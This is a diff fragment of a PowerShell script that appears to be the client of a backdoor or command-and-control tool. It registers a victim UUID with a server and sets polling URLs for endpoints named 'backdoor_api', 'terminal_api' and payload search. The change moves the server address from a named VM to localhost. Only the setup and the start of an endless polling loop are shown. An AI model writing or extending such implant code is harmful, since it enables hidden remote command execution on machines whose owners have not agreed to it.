@@ -14,11 +14,11 @@ $Body = @{
 }
 Invoke-RestMethod -Method 'Post' -Uri $register_url -Body $body
 
-$url = "http://dilkovak-ubuntuvm.mshome.net:8000/payloads/backdoor_api/" + $uuid
-$terminal_url = "http://dilkovak-ubuntuvm.mshome.net:8000/payloads/terminal_api/" + $uuid
-$script_log_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/script_log/"
-$terminal_log_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/terminal_log/"
-$payload_search_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/payload/?payload=&payload_name="
+$url = "http://127.0.0.1:8000/payloads/backdoor_api/" + $uuid
+$terminal_url = "http://127.0.0.1:8000/payloads/terminal_api/" + $uuid
+$script_log_url = "http://127.0.0.1:8000/api/script_log/"
+$terminal_log_url = "http://127.0.0.1:8000/api/terminal_log/"
+$payload_search_url = "http://127.0.0.1:8000/api/payload/?payload=&payload_name="
 
 
 while ($true) {
